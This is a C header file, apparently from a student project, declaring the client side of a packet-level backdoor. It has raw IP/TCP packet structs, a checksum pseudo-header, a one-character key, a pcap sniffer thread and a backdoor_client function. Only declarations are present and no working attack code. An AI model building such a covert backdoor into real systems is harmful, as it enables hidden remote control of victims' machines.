/**
 * client.h
 * authors: Shan Bains & Jivanjot Brar
 */

#ifndef CLIENT_H
#define CLIENT_H

#include <pcap.h>
#include <stdint.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <signal.h>
#include <time.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <pthread.h>
#include <strings.h>

typedef uint32_t uint32;

// Globals
char key = 'A';
char *options[] = { "-dest", "-dest_port", "-source", "-src_port" };
pcap_t *pd;
bool running = true;
FILE *file;
typedef struct _client client;
//typedef struct _packets packets;

struct _client {
	unsigned int source_host;
	unsigned int dest_host;
	unsigned short source_port;
	unsigned short dest_port;
	char srchost[80];
	char desthost[80];
};

static struct _packets {
	struct iphdr ip;
	struct tcphdr tcp;
	//char **data;
	char data[2000];
} packets;

static struct _pseudo_header {
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	struct tcphdr tcp;
} pseudo_header;


client *client_new(void);
void packet_new(client *, char *);
void SystemFatal(char *c);
unsigned short in_cksum(unsigned short *, int);
void send_packets(client *, char *);
void *sniffer_thread(void *);
pcap_t *open_pcap_socket(char *, const char *);
void parse_packet(u_char *, struct pcap_pkthdr *, u_char *);
void backdoor_client(char*, char*);

#endif /* COMMON_H_ */

